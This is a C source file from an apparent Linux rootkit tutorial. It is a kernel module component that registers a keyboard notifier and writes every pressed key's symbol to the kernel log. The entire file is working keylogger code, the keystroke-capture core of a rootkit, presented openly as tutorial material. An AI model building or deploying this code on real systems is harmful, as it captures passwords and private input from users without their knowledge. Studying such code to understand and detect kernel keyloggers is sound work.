// Beneath C Level - Rootkit tutorial
//
// kb_ops.c - Registers a keyboard notifier with the tty subsystem
//
// Author: Nick Newson
// Website: http://beneathclevel.blogspot.co.uk/
//
// Tab size = 4

#include "kb_ops.h"

#include <linux/keyboard.h>
#include <linux/notifier.h>

// Type Declarations
typedef struct notifier_block		notifier_block;
typedef struct keyboard_notifier_param
									keyboard_notifier_param;

// Function Declarations
static int							kb_notifier_call(
										notifier_block*			blk,
										unsigned long			code,
										void*					_param );

// Globals
static notifier_block				g_kb_notifier =
									{
										.notifier_call = kb_notifier_call,
									};


// Function Definitions
void
km_kb_capture(
	void
)
{
	register_keyboard_notifier( &g_kb_notifier );
}

void
km_kb_release(
	void
)
{
	unregister_keyboard_notifier( &g_kb_notifier );
}

static int
kb_notifier_call(
	notifier_block*			blk,
	unsigned long			code,
	void*					_param
)
{
	keyboard_notifier_param*	param = _param;

	if ( code == KBD_KEYSYM && param->down )
	{
		printk( KERN_ERR "km: Keyboard capture - keysym '%c'.\n", param->value );
	}

	return NOTIFY_OK;
}
